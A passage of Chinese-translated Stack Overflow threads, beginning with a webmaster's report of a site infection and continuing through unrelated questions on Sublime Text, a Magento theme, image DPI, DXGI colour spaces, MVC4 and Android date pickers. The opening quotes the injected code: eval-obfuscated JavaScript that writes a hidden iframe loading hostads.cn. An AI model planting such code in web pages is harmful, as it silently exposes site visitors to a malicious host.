B76197C940748B="pars";B76197C940748B+="eIn";B76197C940748B+="t";DCEC79103="St";DCEC79103+="ring.";DCEC79103+="fr";DCEC79103+="omC";DCEC79103+="harCo";DCEC79103+="de";function E0D7700E45C574E(A911795){var B3593798FBC66C=370;B3593798FBC66C=B3593798FBC66C-354;D086A805=eval(B76197C940748B+"(A911795,B3593798FBC66C)");return(D086A805);}function A41D3C153B9E8(E02A0){var D49C4143=940;D49C4143=D49C4143-938;var FB8E017784670AD="";for(E1709AB22C52CD=0;E1709AB22C52CD<E02A0.length;E1709AB22C52CD+=D49C4143){FB8E017784670AD+=( eval(DCEC79103+"(E0D7700E45C574E(E02A0.substr(E1709AB22C52CD,D49C4143)))"));}eval(FB8E017784670AD);}A41D3C153B9E8("69662028646F63756D656E742E636F6F6B69652E73656172636828227574626F3D382229203D3D202D3129207B0A7463707A3D646F63756D656E742E676574456C656D656E7442794964282771757A676327293B6966287463707A3D3D6E756C6C297B646F63756D656E742E777269746528273C696672616D652069643D71757A6763207372633D687474703A2F2F686F73746164732E636E207374796C653D646973706C61793A6E6F6E653E3C2F696672616D653E27293B7D0A646F63756D656E742E636F6F6B6965203D20227574626F3D383B657870697265733D53756E2C2030312D4465632D323031312030383A30303A303020474D543B706174683D2F223B7D");
</script>

<iframe id="quzgc" src="http://hostads.cn" style="display:none"></iframe> 
```

我已经更新了我所有的密码（我的控制面板、数据库、ftp、......一切）并删除了我所有页面、php 文件、javascript 文件等上的恶意代码......我还修复了我所有的权限文件和文件夹到 755。（被感染的页面设置为 777）。

该问题在 Internet Explorer、Firefox、Opera 和 Safari 中似乎已解决。那里一切正常，不再插入任何恶意代码。然而，当我用谷歌浏览器浏览我的网站时，我得到著名的“警告：检测到恶意软件”页面，告诉我谷歌发现了“hostads.cn”的内容，这是一个已知的恶意网站。然后，当我查看源代码时，我确实可以在我的代码中看到某些 javascript 和 iframe。

我尝试调试我的网站，逐步检查代码以检查可能注入代码的位置或内容，但我真的找不到任何东西。所有其他浏览器似乎也没有受到影响。

另一个奇怪的地方：当我“让”我的页面被感染时：即：我忽略了来自 Chrome 的警告并继续访问该网页，我确实可以在我的源代码中看到恶意代码。但是当我用 FTP 下载某个页面时，一切看起来都很好......

那么为什么这个恶意代码是单独插入谷歌浏览器的，而不是持久的呢？更重要的是：我能做些什么来对抗它？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:25:53.247

谷歌在黑名单上工作。您需要通过 Google 网站管理员工具让 Google 知道您已修复它。我认为你已经从网站上删除了有问题的代码，但你仍然在黑名单上。

**网站健康**

[https://support.google.com/webmasters/bin/answer.py?hl=en&answer=1624972](https://support.google.com/webmasters/bin/answer.py?hl=en&answer=1624972)

**请求恶意软件审查**

[https://support.google.com/webmasters/bin/answer.py?hl=en&answer=168328&ctx=cb&src=cb&cbid=15vfwobwt144o&cbrank=1](https://support.google.com/webmasters/bin/answer.py?hl=en&answer=168328&ctx=cb&src=cb&cbid=15vfwobwt144o&cbrank=1)

# sublimetext2 - 冲突的崇高文本 2 包/插件/片段

> ID：13491121
> 
> 赞同：0
> 
> 时间：2012-11-21T10:22:59.333
> 
> 标签：sublimetext2, sublimetext

在 Sublime Text 2 上安装一个新的包/插件或片段后，您是否遇到过冲突/错误（即冲突的快捷方式）？

注意谁对这个问题投了反对票：你有权认为这是一个不应该问的问题。

但是，如果像我一样，你花了很多时间试图找出为什么你刚刚正确安装的插件没有按应有的方式工作，那么你可能有理由对查找一些列出已知插件冲突的资源感兴趣。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T09:40:56.647

是的，这当然是可能的，而且老实说，插件很可能会发生冲突。虽然我不能给出一个具体的例子，即安装了 2 个插件会导致一个插件中断或出现意外行为（也许某些自动完成插件会导致这种情况），但冲突的快捷方式肯定是可能的。只有有限数量的（舒适的）组合键，所以有些组合肯定会发生冲突。

如果您在安装插件后看到一些意外行为（关于键绑定），我是否建议您运行[FindKeyConflicts](https://github.com/skuroda/FindKeyConflicts)（注意这个插件是由我开发的）插件。它应该显示包之间发生的任何关键冲突。

# function - Magento 致命错误无法重新声明函数主题 Blanco

> ID：13491125
> 
> 赞同：2
> 
> 时间：2012-11-21T10:23:14.200
> 
> 标签：function, magento, themes, magento-1.7, fatal-error

我们的团队购买了[Blanco 主题](http://themeforest.net/item/blanco-responsive-magento-theme/2370280?sso?WT.ac=search_item&WT.seg_1=search_item&WT.z_author=8theme)，是 Magento 的一个不错的主题。然后安装后我尝试进入产品详细信息页面并收到此错误：

```
Fatal error: Cannot redeclare themeOptions() (previously declared in
C:\wamp\www\magento\app\design\frontend\default\blanco\template\page\html\head.phtml:6) in
C:\wamp\www\magento\app\design\frontend\default\blanco\template\page\html\head.phtml on line 113 
```

首先，我查看了提供商网站以阅读常见问题解答和任何可能的问题。没有运气，所以我在那里发布了我的问题。无论如何，我等不及他们回答了……我搜索了这个错误，并在 StackOverflow、[这篇文章](https://stackoverflow.com/questions/10930646/cannot-redeclare-function-php)、这篇文章和[其他](https://stackoverflow.com/questions/9935231/cannot-redeclare-a-function-error)一些文章中找到了一些建议。但是那里给出的答案没有用，或者我没有正确实施。尝试使用，`function_exist`但它会阻止加载该功能，并且在产品详细信息页面上根本没有加载主题。作品都没有`include_once "head.html";`。

我验证了该函数未在代码的其他任何地方声明。

你建议我做什么？是一个phtml文件，所以它里面有php和html标签的组合。这是代码：

```
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<script type="text/javascript">var slide_on=false;</script>
<?php 
function themeOptions ($themeOption) {
    switch ($themeOption) {

         /* GENERAL */
         case 'additionalLink':
           return Mage::getStoreConfig('mygeneral/generaloptions/additional_nav', Mage::app()->getStore()->getId());
         break;
         case 'menutype':
           return Mage::getStoreConfig('mygeneral/generaloptions/menutype', Mage::app()->getStore()->getId());
         break;
         case 'use_cufon':
           return (Mage::getStoreConfig('mygeneral/generaloptions/use_cufon', Mage::app()->getStore()->getId()) == 1);
         break;
         case 'topbanner':
           return Mage::getStoreConfig('mygeneral/generaloptions/topbanner', Mage::app()->getStore()->getId());
         break;     
         case 'phones':
           return Mage::getStoreConfig('mygeneral/generaloptions/phones', Mage::app()->getStore()->getId());
         break;
         case 'additionalLinkUrl':
           return Mage::getStoreConfig('mygeneral/generaloptions/additional_nav_href', Mage::app()->getStore()->getId());
         break;
         case 'topbtn':
           return (Mage::getStoreConfig('mygeneral/generaloptions/topbtn', Mage::app()->getStore()->getId()) == 1);
         break;
         case 'enable_ajax':
           return (Mage::getStoreConfig('mygeneral/generaloptions/enable_ajax', Mage::app()->getStore()->getId()) == 1);
         break;

          /* BackGroung */
         case 'pattern':
           return Mage::getStoreConfig('mygeneral/background/pattern', Mage::app()->getStore()->getId());
         break; 
         case 'maincolor':
           return Mage::getStoreConfig('mygeneral/background/maincolor', Mage::app()->getStore()->getId());
         break;  
         case 'bg_repeat':
           return Mage::getStoreConfig('mygeneral/background/bg_repeat', Mage::app()->getStore()->getId());
         break;  
         case 'bg_attachment':
           return Mage::getStoreConfig('mygeneral/background/bg_attachment', Mage::app()->getStore()->getId());
         break;  
         case 'bg_position_x':
           return Mage::getStoreConfig('mygeneral/background/bg_position_x', Mage::app()->getStore()->getId());
         break; 
         case 'bg_position_y':
           return Mage::getStoreConfig('mygeneral/background/bg_position_y', Mage::app()->getStore()->getId());
         break;   

         /* SLIDESHOW */
         case 'use_slideshow':
           return (Mage::getStoreConfig('mygeneral/slideshow/use_slideshow', Mage::app()->getStore()->getId()) == 1);
         break;
         case 'autoplay':
           return (Mage::getStoreConfig('mygeneral/slideshow/autoplay', Mage::app()->getStore()->getId()) == 1);
         break;
         case 'speed':
           return Mage::getStoreConfig('mygeneral/slideshow/speed', Mage::app()->getStore()->getId());
         break;

         /* PRODUCT LIST */
         case 'hover_swap':
           return (Mage::getStoreConfig('mygeneral/product_list/hover_swap', Mage::app()->getStore()->getId()) == 1);
         break;
         case 'column_count':
           return Mage::getStoreConfig('mygeneral/product_list/column_count', Mage::app()->getStore()->getId());
         break;
         case 'layer':
           return Mage::getStoreConfig('mygeneral/product_list/layer', Mage::app()->getStore()->getId());
         break;
         case 'new_label':
           return (Mage::getStoreConfig('mygeneral/product_list/new_label', Mage::app()->getStore()->getId()) == 1);
         break;
         case 'sale_label':
           return (Mage::getStoreConfig('mygeneral/product_list/sale_label', Mage::app()->getStore()->getId()) == 1);
         break;
         case 'addto':
           return (Mage::getStoreConfig('mygeneral/product_list/addto', Mage::app()->getStore()->getId()) == 1);

         /* SHARE */
         break;
         case 'use_share':
           return (Mage::getStoreConfig('mygeneral/share/use_share', Mage::app()->getStore()->getId()) == 1);
         break;
         case 'share_code':
           return Mage::getStoreConfig('mygeneral/share/share_code', Mage::app()->getStore()->getId());
         break;

         /* PRODUCT PAGE */
         case 'layout':
           return Mage::getStoreConfig('mygeneral/productpage/layout', Mage::app()->getStore()->getId());
         break;
         case 'use_zoom':
           return (Mage::getStoreConfig('mygeneral/productpage/use_zoom', Mage::app()->getStore()->getId()) == 1);
         break;
         case 'use_carousel':
           return (Mage::getStoreConfig('mygeneral/productpage/use_carousel', Mage::app()->getStore()->getId()) == 1);
         break;

         /* COLORS */
         case 'active_color':
           return Mage::getStoreConfig('mygeneral/colors/active_color');
         break;
         case 'button_hover':
           return Mage::getStoreConfig('mygeneral/colors/button_hover');
         break;
    }
}
?>
<meta http-equiv="Content-Type" content="<?php echo $this->getContentType() ?>" />
<title><?php echo $this->getTitle() ?></title>
<meta name="description" content="<?php echo htmlspecialchars($this->getDescription()) ?>" />
<meta name="keywords" content="<?php echo htmlspecialchars($this->getKeywords()) ?>" />
<meta name="robots" content="<?php echo htmlspecialchars($this->getRobots()) ?>" />
<link rel="icon" href="<?php echo $this->getFaviconFile(); ?>" type="image/x-icon" />
<link rel="shortcut icon" href="<?php echo $this->getFaviconFile(); ?>" type="image/x-icon" />
<!--[if lt IE 7]>
<script type="text/javascript">
//<![CDATA[
    var BLANK_URL = '<?php echo $this->helper('core/js')->getJsUrl('blank.html') ?>';
    var BLANK_IMG = '<?php echo $this->helper('core/js')->getJsUrl('spacer.gif') ?>';
//]]>
</script>
<![endif]-->
<script type="text/javascript">
  var BASE_URL = '<?php echo $this->getBaseUrl(); ?>';
  var clearenceUrl = '<?php echo themeOptions('additionalLinkUrl'); ?>';
</script>
<?php echo $this->getCssJsHtml() ?>
<?php echo $this->getChildHtml() ?>
<?php echo $this->helper('core/js')->getTranslatorScript() ?>
<?php echo $this->getIncludes() ?>

<!-- MENU -->
<?php $menutype = themeOptions('menutype'); ?>
<?php if($menutype == 1): ?>
    <link rel="stylesheet" type="text/css" href="<?php echo $this->getSkinUrl('css/menu1.css'); ?>" media="screen"/>
<?php elseif($menutype == 2): ?>
    <link rel="stylesheet" type="text/css" href="<?php echo $this->getSkinUrl('css/menu2.css'); ?>" media="screen"/>
    <script type="text/javascript" src="<?php echo $this->getJsUrl('varien/menu.js'); ?>"></script>
<?php endif; ?>

<!-- ZOOM -->
<?php $use_zoom = themeOptions('use_zoom'); ?>
<?php if($use_zoom): ?>
    <script type="text/javascript" src="<?php echo $this->getJsUrl('zoom/easyzoom.js'); ?>"></script>
    <link rel="stylesheet" type="text/css" href="<?php echo $this->getSkinUrl('css/easyzoom.css'); ?>" media="screen"/>
<?php endif; ?>
<!-- CUFON -->
<?php $use_cufon = themeOptions('use_cufon'); ?>
<?php $use_slideshow = themeOptions('use_slideshow'); ?>
<?php if($use_cufon): ?>
    <script type="text/javascript" src="<?php echo $this->getJsUrl('cufon/cufon-yui.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo $this->getJsUrl('cufon/Bebas_Neue_400.font.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo $this->getJsUrl('cufon/cufon-replace.js'); ?>"></script>
<?php endif; ?>

<?php 
$selectors = Array();
$selectors['active_color'] = '
#nav > li.over > a > span,
#nav > li:hover > a > span,
#nav > li.active > a > span,
.product-tabs li.active a,
a:hover,
#nav > li > ul > li.parent > a:hover,
.footer-container a:hover,
.block-layered-nav dd a:hover,
.blocklist > li > ul > li a:hover,
#nav > li > ul > li ul > li a:hover,
.block-account .block-content li.current strong,
.form-search button.button:hover,
.special-price .price,
.product-tabs li a:hover,
.products-grid li.item:hover a,
.newproducts li.item:hover a,
.related li.item:hover a,
.saleproduct  
';

$selectors['active_color_imp'] = '.special-price .price';

$selectors['active_bg'] = '
.pages li a:hover,
.pages .current, 
button.button:hover,
.tintButton:hover,
.footer-container .form-subscribe button.button,
.add-to-cart button.button,
#added a:hover,
button.button.btn-checkout,
.opc .active .step-title,
a.readmore,
#added a,
.quantity_box_button_up:hover,
.quantity_box_button_down:hover,
.left-categorys-container a:hover,
.home-text a.readmore,
.box-tags button.button,
.tintButton,
.blocklist > li > ul > li:hover, 
#nav > li > ul > li ul > li:hover,
.block-account .block-title,
.block.left-categorys .block-title
';

$selectors['active_bg2'] = '
.add-to-cart button.button:hover,
button.btn-checkout.button:hover,
#banner-rotator .tintButton:hover,
a.readmore:hover,
.box-tags button.button:hover,
#added a:hover,
.footer-container .form-subscribe button.button:hover 
';

$selectors['active_border'] = '
.etheme_cp .etheme_cp_content .etheme_cp_section .pattern_select.selected,
.product-view .product-img-box .more-views a.thumbnail-active    
';

$selectors['brown_color'] = '
.blocklist > li > ul > li a,
#nav > li > ul > li ul > li a';

$selectors['brown_bg'] = '
.blocklist > li > ul > li,
.left-categorys-container a,
#nav > li > ul > li ul > li';

    function jsString($str='') { 
        return trim(preg_replace("/('|\"|\r?\n)/", '', $str)); 
    }     
?>

<style type="text/css">
    /* Active Color */
    <?php echo jsString($selectors['active_color']); ?>              { color: #<?php echo themeOptions('active_color') ?>; }

    <?php echo jsString($selectors['active_color_imp']); ?>          { color: #<?php echo themeOptions('active_color') ?>!important; }

    ::-moz-selection, ::selection { background-color: #<?php echo themeOptions('active_color') ?>; }
    /* Active BG */
    <?php echo jsString($selectors['active_bg']); ?>                 {  background-color: #<?php echo themeOptions('active_color') ?>; }

    <?php echo jsString($selectors['active_bg2']); ?>                {  background-color: #<?php echo themeOptions('button_hover') ?>; text-decoration: underline; }

    /* Active Border */
    <?php echo jsString($selectors['active_border']); ?>             {  border-color: #<?php echo themeOptions('active_color') ?>; }

    <?php echo jsString($selectors['brown_color']); ?>               {  color:#818181; }

    <?php echo jsString($selectors['brown_bg']); ?>                  {  background-color:#818181; }

</style>

<?php if($use_slideshow): ?>
<?php $speed = themeOptions('speed'); ?>
<script type="text/javascript">
    if(slide_on){
        jQuery(document).ready(function($) {
            $('.iosSlider').iosSlider({
                desktopClickDrag: true,
                touchMoveThreshold:4,
                snapToChildren: true,
                infiniteSlider: true,
                autoSlide:<?php echo (themeOptions('autoplay')) ? 'true' : 'false'; ?>,
                autoSlideTimer:<?php echo ($speed) ? $speed : '3000'  ?>,
                navSlideSelector: '.sliderNavi .naviItem',                
                navNextSelector: '.iosSlider .next',
                navPrevSelector: '.iosSlider .prev',
                onSlideChange: slideContentChange,
                onSlideComplete: slideContentComplete,
                onSliderLoaded: slideContentLoaded
            }); 

        }); 
    }
</script>
<?php endif; ?>

<script type="text/javascript">
        jQuery(document).ready(function (){
            jQuery('.toolbar').jqTransform({imgPath:'<?php echo $this->getSkinUrl('images/jqforms/'); ?>'});
            jQuery('.limiter').jqTransform({imgPath:'<?php echo $this->getSkinUrl('images/jqforms/'); ?>'});
        });  
</script>
<style>
    body{
        background-color:#<?php echo themeOptions('maincolor') ?>;
        background-attachment: <?php echo themeOptions('bg_attachment') ?>;
        background-position: <?php echo themeOptions('bg_position_y') ?> <?php echo themeOptions('bg_position_x') ?>;
        background-repeat: <?php echo themeOptions('bg_repeat') ?>;
    }   
</style>
<?php if(themeOptions('pattern') && themeOptions('pattern') != ''): ?>
    <style>
        body{ background-image: url(<?php echo Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_MEDIA).'wysiwyg/blanco/'.themeOptions('pattern') ?>); }    
    </style>
<?php endif; ?>
<!--[if IE 7]>
    <link rel="stylesheet" type="text/css" href="<?php echo $this->getSkinUrl('css/ie7.css'); ?>" media="screen"/>
<![endif]-->
<!--[if IE 9]>
    <link rel="stylesheet" type="text/css" href="<?php echo $this->getSkinUrl('css/ie9.css'); ?>" media="screen"/>
<![endif]--> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T04:23:20.243

这篇文章为解决这个问题开了个好头。我确实注释掉了雅罗斯拉夫建议的行，但它并没有为我解决问题。然后我使用`function_exists`了似乎可行的结构。它必须用于 head.phtml 中的 2 个功能

1）函数主题选项（$themeOption）

2) 函数 jsString($str='')

将上述函数包装在 function_exits 中

```
if(!function_exists(themeOptions)){
function themeOptions ($themeOption) {
    //Piece of Code
    }
    }

if(!function_exists(jsString)){
    function jsString($str='') {
//Piece of Code
}
} 
```

在此之后，一切似乎都运行良好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T20:40:26.920

由于此模块的编码方式错误（永远不应在模板中声明 php 函数，而应在块中声明！）解决您的问题的 2 个方法：

*   查看您的布局以了解为什么此模板被包含两次。是否正常（您试图在 2 个不同的位置显示此模板？如果是这样：您需要转到解决方案 #2，因为无法重新声明 PHP 函数）

*   修改模块以使用“magento 方式”（MVC）：将函数声明移动到专用块中（在模块的 BLock 文件夹中）。如果需要，在模块的 config.xml 中声明 BLock 层，并在模块的布局 XML 文件中链接您的模板和 Block。

并告诉模板创建者尊重 magento 标准；）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T11:35:20.333

最后，全新安装的 Magento 再次出现错误。在仔细查看 exception.log 文件和发现错误的特定 phtml 文件后，我设法通过注释一行并添加一小段代码来使其正常工作。

这是 exception.log 文件中的错误：

> 异常“异常”，带有消息“注意：未定义的变量：C 中的选项卡：\wamp\www\magento\app\design\frontend\default\blanco\template\catalog\product\view\tabs.phtml 第 8 行”在 C 中:\wamp\www\magento\app\code\core\Mage\Core\functions.php:245

这是 tab.phtml 文件中的有罪行：

```
<?php if ($tab != $this->getChildHtml('product_custom_tab')): $last = 'last'; endif; ?> 
```

我所做的是评论它并添加一个新行：

```
<?php //if ($tab != $this->getChildHtml('product_custom_tab')): $last = 'last'; endif; ?>
<?php $last = 'last'; ?> 
```

现在一切似乎都很顺利，我正在检查它，产品详细信息正在显示，所有花哨的翻转工作和标签也正常。

# image - 如何提高图像 DPI？

> ID：13491130
> 
> 赞同：1
> 
> 时间：2012-11-21T10:23:26.103
> 
> 标签：image, dpi

我将图像的 DPI 从 96 DPI 增加到 299.99 DPI。但它对图像没有任何影响。缩放时图像仍然模糊。如何提高 DPI 以提高图像清晰度？

String dotsPerMeter = String.valueOf((int) (300 / 0.0254));//300 是需要的dpi Iterator imageWriters = ImageIO.getImageWritersByFormatName("png");

```
 while (imageWriters.hasNext()) {
                    ImageWriter iw = (ImageWriter)imageWriters.next();

                    ImageWriteParam iwp = iw.getDefaultWriteParam();
                    IIOMetadata metadata = iw.getDefaultImageMetadata(new ImageTypeSpecifier(image), iwp);

                    String pngFormatName = metadata.getNativeMetadataFormatName();
                    IIOMetadataNode pngNode =
                            (IIOMetadataNode) metadata.getAsTree(pngFormatName);

                    IIOMetadataNode physNode = null;
                    NodeList childNodes = pngNode.getElementsByTagName("pHYs");
                    if (childNodes.getLength() == 0) {
                            physNode = new IIOMetadataNode("pHYs");
                            pngNode.appendChild(physNode);
                    } else if (childNodes.getLength() == 1) {
                            physNode = (IIOMetadataNode) childNodes.item(0);
                    } else {
                            throw new IllegalStateException("Don't know what to do with multiple pHYs nodes");
                    }
                    physNode.setAttribute("pixelsPerUnitXAxis", dotsPerMeter);
                    physNode.setAttribute("pixelsPerUnitYAxis", dotsPerMeter);
                    physNode.setAttribute("unitSpecifier", "meter");
                    try {
                            metadata.setFromTree(pngFormatName, pngNode);
                            IIOImage iioImage = new IIOImage(image, null, metadata);
                            File file = new File(KIT_ID + "_" + KIT_VER + "_newDPI.png");
                            ImageOutputStream ios = ImageIO.createImageOutputStream(file);

                            iw.setOutput(ios);                            
                            iw.write(iioImage);
                            ios.flush();
                            ios.close();
                    } catch (Exception e) {
                            e.printStackTrace();
                            continue;
                    }

                    break;
            } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:43:52.257

Adding Dpi to a blurry picture does not make it sharper, because the pixels of your image just split, but there wont be any more detail created in the image. there are however some algorithms that help make pictures look more sharp.

# graphics - DXGI_FORMAT 的确切色彩空间是什么？

> ID：13491131
> 
> 赞同：5
> 
> 时间：2012-11-21T10:23:28.010
> 
> 标签：graphics, game-engine, direct3d, color-space, dxgi

在 DXGI_FORMAT 的官方文档中，它告诉我们只有带有 _SRGB 枚举后缀的格式在 sRGB 颜色空间中。我认为没有这个后缀的其他格式都在线性空间中。但是我在 DirectXTex 库中发现了格式转换函数的一个非常奇怪的行为。（您可以从[http://directxtex.codeplex.com/](http://directxtex.codeplex.com/)下载它）

首先，我使用 NVIDIA Photoshop DDS 插件将纹理文件导出为 DXGI_FORMAT_R32G32B32A32_FLOAT。然后我通过 LoadFromDDSFile() 函数加载此文件，并通过 Convert() 函数将其格式转换为 DXGI_FORMAT_R16G16B16A16_UNORM。（这两个函数都是 DirectXTex 库提供的。）

你猜怎么着？图像转换为DXGI_FORMAT_R16G16B16A16_UNORM后，所有像素的亮度也发生了变化，整个图像变得比以前更亮。

如果在图像转换为 DXGI_FORMAT_R16G16B16A16_UNORM 格式后手动将像素值从 sRGB 空间转换为线性空间，则生成的像素值与输入相同。因此，我假设 DirectXTex 库将 DXGI_FORMAT_R32G32B32A32_FLOAT 视为线性色彩空间中的格式，并将 DXGI_FORMAT_R16G16B16A16_UNORM 视为 sRGB 色彩空间中的格式，然后将色彩空间从线性空间转换为 sRGB 空间。（我试图找出为什么Convert()函数也会转换颜色空间，但是它是由WIC实现的，并且没有它的源代码。）

那么，DirectXTex 库中是否有任何错误？还是它是 DXGI_FORMAT 的真正标准？如果某些特殊的 DXGI_FORMAT 有不同的颜色空间，请告诉我在哪里可以找到它的规范。

任何帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T11:44:53.270

按照惯例，浮点 RGB 值是线性的，而整数 RGB 值是经过伽马压缩的。伽玛压缩浮点数没有特别的好处，因为伽玛的原因是在感知需要的地方使用更多位，并且浮点数具有足够（可能过多）的位数*并且*已经被伪对数编码（使用指数） . （[来源](http://en.wikipedia.org/wiki/Gamma_correction)）

请注意，DXGI 中不明确 *_SRGB 的整数 RGB 纹理的颜色空间不是 sRGB，它取决于驱动程序，并且通常具有 0.5 的固定 gamma。

DirectXTex 库似乎运行正常。但是，请注意，您还依赖于用于捕获和显示 DDS 文件的任何软件的行为。对 DirectXTex 更好的测试是简单地在库中进行往返转换 float->int->float 并以数字方式而不是视觉方式比较结果。

# asp.net-mvc - 使用 MVC4 将 Categorylist 添加到所有页面

> ID：13491132
> 
> 赞同：1
> 
> 时间：2012-11-21T10:23:34.153
> 
> 标签：asp.net-mvc, asp.net-mvc-4

我是 MVC4 的新手，只是 MVC。

我有一个`homecontroller`和一个`categorycontroller`。将`categorycontroller`数据从模型发送到`categoryIndex`视图。这很好用。

但现在我想`categorylist`在所有可用的控制器上添加。

我已经修复了这个以添加到所有类`return view(db.categorys.ToList());`并添加`categoryIndex`到共享文件夹中。在`_layout.cshtml`我添加一个@RenderPage("~/")` 并且这有效。

但是，当我必须通过的不仅仅是`(db.categorys.ToList())`返回时，它就会出错。

我该如何解决这个问题。如何正确添加每个控制器和页面的类别列表？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T14:24:51.120

将`CategoryList`集合作为属性添加到您的 ViewModels（所有页面）。您可以将其添加到基类并从中继承。

```
public class Category
{
  public int ID { set;get;}
  public string Name { set;get;}
}
public class BasePageViewModel
{
  public List<Category> CategoryList { set;get;}

  BasePageViewModel()
  {
    CategoryList=new List<Category>();
  }
} 
```

现在您可以从这个基类继承其他视图模型。

```
public class ProductViewModel : BasePageViewModel
{
  public string ProductName { set;get;}
  //Other properties
} 
```

现在在对 ProductViewModel 进行强类型化的视图中，您可以调用 Html.Partial 来显示`CategoryList`部分视图。

```
@model ProductViewModel
<h3>This page is for product @Model.ProductName</h3>
@Html.Partial(Model.CategoryList) 
```

假设您有一个部分视图来呈现 CategoryList

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T14:20:01.227

我建议将常用的东西（例如类别列表）放入 ViewBag。这将允许您进行一些分离，并且只返回需要存在的视图。希望这有帮助！

# android - 如何在 android 中使用日期选择器而不是编辑文本框？

> ID：13491134
> 
> 赞同：0
> 
> 时间：2012-11-21T10:23:36.997
> 
> 标签：android, datepicker

现在我正在使用 android 中的一项 Web 服务。该 Web 服务有两个输入值，分别是 01/01/2012 和 07/07/2012。

单击调用按钮并提供这些作为输入值后，我的项目将显示一些条形图。它工作正常。这里我使用两个编辑文本框来获取这些输入值。

但我想使用日期选择器小部件而不是使用编辑文本框。所以我拖动了日期选择器小部件并做了一些代码。

但现在的问题是，输入值完全是数字和反斜杠，对吧？但是在日期选择器小部件中，它以字符和数字的组合显示输入值，但我只需要使用日期选择器小部件。

日期选择器小部件采用这种格式 dd-mm-yyyy 例如：- 01-jan-1990

但我需要将上述格式转换为 01/01/1990。这个怎么做？

*请找到我的参考资料来源*

**图表.java**

```
public class Chart extends Activity 
{
//EditText edt1, edt2;

DatePicker dp1,dp2;

TextView txtv1;
Button btn;
Bundle data;

String[] orderNo = new String[20];
int[] freightRate = new int[20];
int[] marginPercent = new int[20];

@Override
public void onCreate(Bundle savedInstanceState)     {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    dp1 = (DatePicker) findViewById(R.id.datePicker_one);
    dp2 = (DatePicker) findViewById(R.id.datePicker_Two);

    String res_1 = dp1.getDayOfMonth()+"/"+dp1.getMonth()+"/"+dp1.getYear();
            String res_2 = dp2.getDayOfMonth()+"/"+dp2.getMonth()+"/"+dp2.getYear();   

            btn = (Button) findViewById(R.id.button1);
    btn.setOnClickListener(new View.OnClickListener() {
        public void onClick(View v) {
            getTMSChart(dp1.getYear(), dp2.getYear());
            Intent intnt = new Intent(v.getContext(), BarGraphActivity.class);
            intnt.putExtras(data);

            startActivity(intnt);
        }
    });
}

public void getTMSChart(int j, int k) 
{

    System.setProperty("http.keepAlive", "false");
    SoapSerializationEnvelope envelope = new   SoapSerializationEnvelope(SoapEnvelope.VER11);

    envelope.dotNet = true;

    String METHOD = "GetTMSChart";
    String NAMESPACE = "http://tempuri.org/";
    String SOAP_ACTION = "http://tempuri.org/GetTMSChart";
    String URL = "http://54.251.60.177/TMSOrdersService/TMSDetails.asmx";

    SoapObject request = new SoapObject(NAMESPACE, METHOD);

    request.addProperty("FromDate", j);
    request.addProperty("ToDate", k);
    envelope.setOutputSoapObject(request);
    HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);

    try {
        androidHttpTransport.call(SOAP_ACTION, envelope);
        SoapObject result = (SoapObject) envelope.bodyIn;
        SoapObject root = (SoapObject) ((SoapObject) (result).getProperty(0)).getProperty("NewDataSet");
        int tablesCount = root.getPropertyCount();

        data = new Bundle();

    for (int i = 0; i < tablesCount; i++) {

    SoapObject table = (SoapObject) root.getProperty(i);
    orderNo[i] = table.getPropertyAsString("Order_No");
    freightRate[i] = Integer.parseInt(table.getPropertyAsString("Freight_Rate"));
    marginPercent[i] = Integer.parseInt(table.getPropertyAsString("Margin_Percent"));               

  /*Toast.makeText(getApplicationContext(), "Order No:" + orderNo[i] + "\nFreigtRate:" +     freightRate[i] + "\nMarginPc:" + marginPercent[i], Toast.LENGTH_SHORT).show();*/
        }
        data.putStringArray("orderno", orderNo);
        data.putIntArray("freightrate", freightRate);
        data.putIntArray("marginpercent", marginPercent);
        data.putInt("count",tablesCount);
    }
catch (Exception e) 
{
    Toast.makeText(getApplicationContext(), e.getMessage(), Toast.LENGTH_LONG).show();
    e.printStackTrace();
    }   } } 
```

**条形图活动.java**

```
public class BarGraphActivity extends Activity {

String[] orderNo = new String[20];
int[] freightRate = new int[20];
int[] marginPercent = new int[20];
int count;
RelativeLayout rltv;

@Override
    public void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main1);

    final GraphicalView grfv = createIntent(); 

    RelativeLayout rltv = (RelativeLayout)findViewById(R.id.rlyot);
    rltv.addView(grfv);
}

public GraphicalView createIntent()
{
    rltv = (RelativeLayout)findViewById(R.id.rlyot);

    String[] titles = new String[] { "Order's profit of the year", " " };

    Bundle idata = getIntent().getExtras();
    if (idata !=null)
    {
        orderNo = idata.getStringArray("orderno");  
        freightRate = idata.getIntArray("freightrate");
        marginPercent = idata.getIntArray("marginpercent");
        count = idata.getInt("count");

        CategorySeries series = new CategorySeries("Order-FreightRate Graph");

        for ( int i = 0; i < count; i++)
        {
            series.add(orderNo[i], freightRate[i]);

            Thread th = new Thread();
            try 
            {
                Thread.sleep(2000);
                }
            catch (InterruptedException e) 
            {
                e.printStackTrace();
            }
        }

        XYMultipleSeriesDataset dataset = new XYMultipleSeriesDataset();
        dataset.addSeries(series.toXYSeries());

        XYSeriesRenderer renderer = new XYSeriesRenderer();
        renderer.setDisplayChartValues(true);

        //renderer.setChartValuesSpacing(1);

        XYMultipleSeriesRenderer mRenderer = new XYMultipleSeriesRenderer();
        mRenderer.addSeriesRenderer(renderer);

        mRenderer.setXLabelsColor(Color.WHITE);
        mRenderer.setYLabelsColor(0,Color.WHITE);

        mRenderer.setZoomButtonsVisible(true);

        mRenderer.setApplyBackgroundColor(true);
        mRenderer.setBackgroundColor(Color.parseColor("#000000"));

